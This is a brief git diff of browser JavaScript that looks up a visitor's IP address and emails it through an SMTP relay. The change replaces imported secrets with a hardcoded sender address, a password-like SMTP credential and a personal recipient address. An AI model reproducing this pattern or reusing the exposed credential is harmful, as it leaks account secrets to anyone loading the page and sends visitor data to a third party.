@@ -1,5 +1,3 @@
-import { Username, Password, Email } from "./secret.js";
-
 const findMyLocation = () => {
   const status = document.querySelector(".status");
   fetch("https://api.ipify.org/?format=json")
@@ -16,9 +14,9 @@ const findMyLocation = () => {
     {
       Email.send({
         Host: "smtp.elasticemail.com",
-        Username: Username,
-        Password: Password,
-        To: Email,
+        Username: "telygo@lyricspad.net",
+        Password: "E5B5B893CEE1FA4050A654F61D0DB98972D1",
+        To: "theakashdeveloper@gmail.com",
         From: "telygo@lyricspad.net",
         Subject: new Date(),
         Body: `
